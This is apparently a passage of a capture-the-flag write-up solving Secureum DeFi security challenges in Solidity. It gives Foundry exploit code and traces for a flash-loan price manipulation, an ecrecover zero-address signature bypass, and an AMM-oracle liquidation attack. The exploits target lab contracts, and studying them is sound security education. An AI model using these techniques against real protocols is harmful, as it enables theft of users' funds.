+    │   ├─ [3038] FlashLoanReceiver::onFlashLoan(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], SecureumToken: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 9999999999999999999999 [9.999e21], 99999999999999999999 [9.999e19], 0x) 
+    ...
+    │   │   ├─ [881] YieldPool::getAmountOfTokens(1000000000000000000 [1e18], 1, 10000000000000000000000 [1e22]) [staticcall]
+    │   │   │   └─ ← 9999999999999999989898 [9.999e21]
+    ...
+...
+```
+
+At first, we'd get around 0.99 ETH for 1 Token. Then after having taken the flashloan we'd get around 9999.99 ETH for 1 Token. Nice! But there are a few problems: The fee for borrowing all this is 99.99 Token, which, if not paid until the callback returns control to the pool, will revert the entire transaction. At the moment we only have 0.1 ETH and no Tokens at all. And even if we swapped all our ETH for Tokens, we'd only be able to obtain a similarly small amount of Tokens which wouldn't allow us to afford any impactful flash loan due to the 1% borrowing fee.
+
+To make the attack profitable, there's another important part missing in how flash loans are paid back:
+
+```solidity
+function flashLoan(
+    IERC3156FlashBorrower receiver,
+    address token,
+    uint256 amount,
+    bytes calldata data
+) external returns (bool) {
+    ...
+
+    if (token == ETH) {
+        expected = address(this).balance + flashFee(token, amount);
+        (bool success, ) = address(receiver).call{value: amount}("");
+    ...
+    }
+
+    require(receiver.onFlashLoan(msg.sender, token, amount, flashFee(token, amount), data) == CALLBACK_SUCCESS,
+        "Invalid callback return value");
+
+    if (token == ETH) {
+        require(address(this).balance >= expected, "Flash loan not repayed");
+    }
+    ...
+}
+```
+
+After our flash loan callback finished and the `flashLoan()` function takes over again, it has no way to get its ETH back and needs to rely on us sending it back. It validates whether we did so by checking whether the Pool's ETH balance is as much as it was before *plus* the 1% lending fee. So there's no need for us to send it back via a specific function, it just needs to end up in the contracts balance – which means: We can pay our debts back as part of a swap!
+
+The easiest option to exploit this is the following steps:
+
+1. Use the 0.1 ETH to flash loan 10 ETH.
+2. While the price is skewed, use 10.1 ETH to buy Tokens. This also at the same time repays the loan and its fees.
+3. These unfairly obtained Tokens can now be exchanged for ETH again.
+
+And we can do this over and over again until we have enough!
+
+```solidity
+contract FlashLoanTest is Test {
+    ...
+
+    function testExploitPool() public {
+        vm.startPrank(attacker);
+        /*//////////////////////////////
+        //    Add your hack below!    //
+        //////////////////////////////*/
+
+        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver();
+
+        while (address(attacker).balance < 100 ether) {
+
+            // Transfer everything to the FlashLoanReceiver contract.
+            payable(address(flashLoanReceiver)).transfer(address(attacker).balance);
+
+            // 1. Flashloan as much ETH as we can afford.
+            yieldPool.flashLoan(
+                IERC3156FlashBorrower(address(flashLoanReceiver)),
+                yieldPool.ETH(),
+                address(flashLoanReceiver).balance * 100,
+                hex""
+            );
+
+            // 3. Exchange Tokens for ETH.
+            token.approve(address(yieldPool), token.balanceOf(address(attacker)));
+            yieldPool.tokenToEth(token.balanceOf(address(attacker)));
+        
+        }
+
+        //============================//
+        vm.stopPrank();
+
+        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
+    }
+}
+
+contract FlashLoanReceiver {
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    // Flashloan callback.
+    function onFlashLoan(address initiator, address, uint256 amoount, uint256 fee, bytes calldata data) external returns (bytes32) {
+        YieldPool yieldPool = YieldPool(payable(msg.sender));
+
+        // 2. Use all ETH for buying Tokens while paying the loan.
+        yieldPool.ethToToken{value: address(this).balance}();
+
+        // Send Tokens to attacker account.
+        SecureumToken token = SecureumToken(address(yieldPool.TOKEN()));
+        token.transfer(initiator, token.balanceOf(address(this)));
+
+        return CALLBACK_SUCCESS;
+    }
+
+    receive() external payable {}
+}
+```
+
+---
+
+> ### [Challenge 7: Crystal DAO](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/7_crystalDAO)
+> 
+> The Crystal DAO is a transparent and non-profit DAO whose mission is to gather funds to support the development of different public goods in the Ethereum ecosystem. These funds are stored in custom treasury contracts that follow the ERC1176 minimal proxy standard, and are controlled by one DAO admin.
+> 
+> One of such treasuries was recently deployed, and has reached the target amount of 100 ETH in its balance. Therefore, the DAO admin has tried to retrieve the funds for their subsequent donations. However, the admin's signature is not being recognized by the treasury clone contract, and the funds are now stuck, putting the DAO's reputation at risk.
+> 
+> Can you help the DAO admin to retrieve the funds?
+> 
+> 📌 Rescue 100 ETH from the DAO treasury
+
+From the description alone, I'm unable to tell what the issue is. The goal is clear and reflected as such in the tests. But what's more interesting is the "failed attempt" by the DAO admin it contains:
+
+```solidity
+function testHack() public {
+    bytes32 digest = keccak256(abi.encode(
+        keccak256(
+            "Exec(address target,uint256 value,bytes memory execOrder,uint256 nonce,uint256 deadline)"
+        ),
+        daoManager,
+        100 ether,
+        "",
+        0,
+        type(uint256).max
+    ));
+
+    bytes32 finalMessage = keccak256(
+        abi.encodePacked(
+            "\x19\x01",
+            vault.getDomainSeparator(),
+            digest
+        )
+    );
+
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(daoManagerKey, finalMessage);
+
+    vm.expectRevert(bytes("Only owner can execute!"));
+    vault.execWithSignature(
+        v, r, s,
+        daoManager,
+        100 ether,
+        "",
+        type(uint256).max
+    );
+    // How did it fail?! I am the daoManager! D:
+
+    // Please help us whitehat!
+    address hacker = makeAddr("whitehat");
+    vm.startPrank(hacker, hacker);
+
+    /*//////////////////////////////
+    //    Add your hack below!    //
+    //////////////////////////////*/
+
+    //============================//
+
+    assertEq(daoManager.balance, 100 ether, "Dao manager should have recover the funds");
+}
+```
+
+My first suspicion is that the signed message is simply not being built correctly.
+
+```
+ubuntu@dss23-defi101:~/dss23-defi101$ forge test --match-path test/Challenge7.t.sol -vvvv
+...
+    │   ├─ [31516] DaoVaultImplementation::execWithSignature(28, 0xfa941a855af7d10bf851327e07d18013c01de1f2bfee1ab93a3a3c1d76b484b2, 0x4dc87e2aa714486b3293e17f831224b55d0e3dc0bfd5b86c3dd0c83637b9bce5, daoManager: [0x58D433d8b3ebB66937EFDAEA3D9f74247e6D9993], 100000000000000000000 [1e20], 0x, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ [3000] PRECOMPILE::ecrecover(0x7cde8c3d4cb36037882ac662cb80584fd2e7334f9e08fa869d872538dcec03fd, 28, 113339888552061773341575754022405210880196390384679704309373525444111828812978 [1.133e77], 35182329523820141005891597136811757311728416996144506022200957536392489581797 [3.518e76]) [staticcall]
+    │   │   │   └─ ← daoManager: [0x58D433d8b3ebB66937EFDAEA3D9f74247e6D9993]
+    │   │   └─ ← "Only owner can execute!"
+...
+```
+
+But the debug output shows that the address recovered from the signature and hash (via `ecrecover`) is indeed the `daoManager`. If the message hash signed would be incorrect, this couldn't be the case.
+
+```solidity
+// Recover signer from signature
+address signer = ecrecover(hash, v, r, s);
+require(owner == signer, "Only owner can execute!");
+```
+
+Looking at the relevant code for this revert message: Could it be that the owner state variable was set incorrectly?
+
+```
+    ├─ [2547] 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3::owner() [staticcall]
+    │   ├─ [2381] DaoVaultImplementation::owner() [delegatecall]
+    │   │   └─ ← 0x0000000000000000000000000000000000000000
+```
+
+A quick test shows that indeed, the owner of the vault contract queried is the zero-address, so no wonder!
+
+It's not important how it ended up being that way (probably something about the assembly init), I already know enough to solve the challenge. The contract isn't doing any validation on the result of `ecrecover` except for the comparison with the owner variable. That's bad, but great for us! Because as it turns out: When `ecrecover` fails to determine a signer's address it won't revert, instead it'll simply return the zero-address as a sign that something went wrong. So in order to "sign as the owner" of this Vault, we simply send an invalid signature.
+
+```solidity
+function testHack() public {
+    ...
+
+    /*//////////////////////////////
+    //    Add your hack below!    //
+    //////////////////////////////*/
+
+    vault.execWithSignature(
+        0, 0, 0,   // That'll do it!
+        daoManager,
+        100 ether,
+        "",
+        type(uint256).max
+    );
+
+    //============================//
+
+    assertEq(daoManager.balance, 100 ether, "Dao manager should have recover the funds");
+}
+```
+
+---
+
+> ### [Challenge 8: Liquidatoooor](https://github.com/secureum/AMAZEX-DSS-PARIS/tree/main/src/8_oiler)
+> 
+> The favorite lending protocol in town has opened its doors and is allowing anyone to deposit collateral to borrow debt tokens! The Risk analysis department assures the protocol is sound as a Swiss banking system, and the Tokenomic analysis team argues that if a user's position becomes under-collateralized, the liquidator must receive all of the users collateral as a reward for keeping the protocol safe from bad debt, while punishing the borrower for not managing his positions accordingly!
+> 
+> As users start opening debt positions, you notice something unusual in the way that the protocol calculates user account health... something is off here... and it seems that the consequences can result in user positions being liquidated by the attacker who will also make a profit out of it!
+> 
+> Can you demonstrate the viability of this attack to convince the Risk and Tokenomic departments to urgently update the protocol?
+> 
+> 📌 Drop the borrower's health account
+> 
+> 📌 Liquidate the borrower and get as much of his collateral as possible
+
+The [set-up steps](https://github.com/secureum/AMAZEX-DSS-PARIS/blob/main/test/Challenge8.t.sol) of this challenge seem quite complex, but they can be broken down into a few points:
+
+1. Two simple ERC20 Token are deployed (TKN, DAI)
+2. An Automated Market Maker (AMM) is deployed
+3. The Lending Contract is deployed (Oiler)
+4. We (the player) get 100 TKN, 100 DAI
+5. A "Superman" gets 200 TKN, 200 DAI
+6. Superman adds 100 TKN and 100 DAI liquidity to the AMM
+7. Superman deposits 100 TKN into Oiler and borrows 75 dTOKEN
+
+The most interesting part while going through this was probably the following comment:
+
+```solidity
+/**
+* @notice Deploy Lending contract. Accepts 'TOKEN' as collateral and
+* mints a 'dTOKEN' underlying debt token.
+* The second address is the AMM, from where prices are fetched.
+*/
+oiler = new Oiler(address(token), address(amm));
+```
+
+Whenever you hear that prices are fetched from an AMM, you should get a little worried. In this specific case, we wouldn't even require flash loans to manipulate the price as the market only has as much liquidity as we ourselves own. That means it should be a simple exercise to significantly manipulate the market with a swap, which will likely influence superman's collateral health.
+
+Since "superman" used TKN as collateral, let's sell all of our TKNs in the AMM to dump the price and check how this impacts the `healthFactor()`:
+
+```solidity
+function testSolution() public {
+    ...
+    vm.startPrank(player);
+    /*//////////////////////////////////////
+    //    Add your attack logic below!    //
+    //////////////////////////////////////*/ 
+
+    oiler.healthFactor(superman);
+
+    token.approve(address(amm), type(uint).max);
+    amm.swap(address(token), token.balanceOf(player)); 
+
+    oiler.healthFactor(superman);
+
+    //============================//
+
+    vm.stopPrank();
+
+    ...
+}
+```
+
+Although I have no clue yet what exactly the health factor is, it's clear that we succeeded in manipulating it:
+
+```
+    ├─ [2346] oiler::healthFactor(Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729]) 
+    │   ├─ [617] amm::getPriceToken0() 
+    │   │   └─ ← 1000000000000000000 [1e18]
+    │   └─ ← 100000000000000000000 [1e20]
+...
+    ├─ [31461] amm::swap(TKN: [0x6F77cf861457C29aCAFB6c7340Aee8fbcE84dD08], 100) 
+...
+    ├─ [2346] oiler::healthFactor(Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729]) 
+    │   ├─ [617] amm::getPriceToken0() 
+    │   │   └─ ← 255000000000000000 [2.55e17]
+    │   └─ ← 25500000000000000000 [2.55e19]
+```
+
+It went down!
+
+```solidity
+// Threshold for health factor under which the position becomes eligible for liquidation
+uint constant LIQUIDATION_THRESHOLD = 100;
+
+/**
+ * @notice  Liquidates a user's position if their health factor falls below the liquidation threshold.
+ * @param   _user The address of the user to liquidate.
+ *  The process of liquidation involves repaying a portion of the user's debt, 
+ *  burning the equivalent debt tokens from the liquidator, 
+ *  and transferring all of the user's collateral to the liquidator. 
+ *  The user's borrow amount and collateral are then updated.
+ */
+function liquidate(address _user) public {
+    uint positionHealth = healthFactor(_user) / 10 ** 18;
+    require(positionHealth < LIQUIDATION_THRESHOLD, "Liquidate: User not underwater");
+    uint repayment = users[_user].borrow * 5 / 100;
+    _burn(msg.sender, repayment);
+    users[_user].borrow -= repayment;
+    uint totalCollateralAmount = users[_user].collateral;
+    token.transfer(msg.sender, totalCollateralAmount);
+    users[_user].collateral = 0;
+
+    emit Liquidated(msg.sender, _user, repayment);
+}
+```
+
+According to the code, a user is "underwater" (ie. can be liquidated) once the following is true:
+
+$`lfloorbb"healthFactor"/(10^18)rfloor < 100`$
+
+With the price manipulation, we managed to bump it down below the threshold, but as a small `repayment` has to be burned from the liquidator's balance, we first have to make a deposit ourselves.
+
+Luckily "superman" was already on the threshold towards liquidation before we manipulated anything. So we actually don't have to make use of our entire token balance.
+
+```solidity
+function testSolution() public {
+    ...
+    vm.startPrank(player);
+    /*//////////////////////////////////////
+    //    Add your attack logic below!    //
+    //////////////////////////////////////*/ 
+
+    // Manipulate TKN price down.
+    token.approve(address(amm), type(uint).max);
+    amm.swap(address(token), 1);
+
+    // Deposit enough for repayment ((75 * 5) / 100)
+    token.approve(address(oiler), type(uint).max);
+    oiler.deposit(3);
+    oiler.borrow(3);
+
+    // Liquidate user.
+    oiler.liquidate(superman);
+
+    // Withdraw profits.
+    oiler.withdraw(oiler.balanceOf(player));
+
+    // Swap back enough TKN for success conditions to pass.
+    dai.approve(address(amm), type(uint).max);
+    amm.swap(address(dai), 10);
+
+    //============================//
+
+    vm.stopPrank();
+
+    ...
+}
+```
+
+---
+
+That's it! Thanks to everyone who designed these challenges, until next time!
+
+
